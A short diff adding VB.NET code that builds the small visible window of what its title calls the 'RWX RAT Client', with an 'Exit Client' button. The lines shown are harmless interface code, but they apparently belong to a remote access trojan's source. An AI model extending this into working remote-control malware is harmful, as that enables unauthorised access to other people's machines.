@@ -1,0 +1,12 @@
+﻿		Dim frm As New System.Windows.Forms.Form
+        frm.Text = "RWX RAT Client " & Version
+        frm.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
+        frm.ControlBox = False
+        Dim btn As New System.Windows.Forms.Button
+        btn.Text = "Exit Client"
+        frm.Controls.Add(btn)
+        frm.Size = New System.Drawing.Size(New System.Drawing.Point(268, 96))
+        btn.Size = New System.Drawing.Size(New System.Drawing.Point(252, 62))
+        AddHandler btn.Click, AddressOf btn_Click
+        frm.Show()
+        frm.Focus()
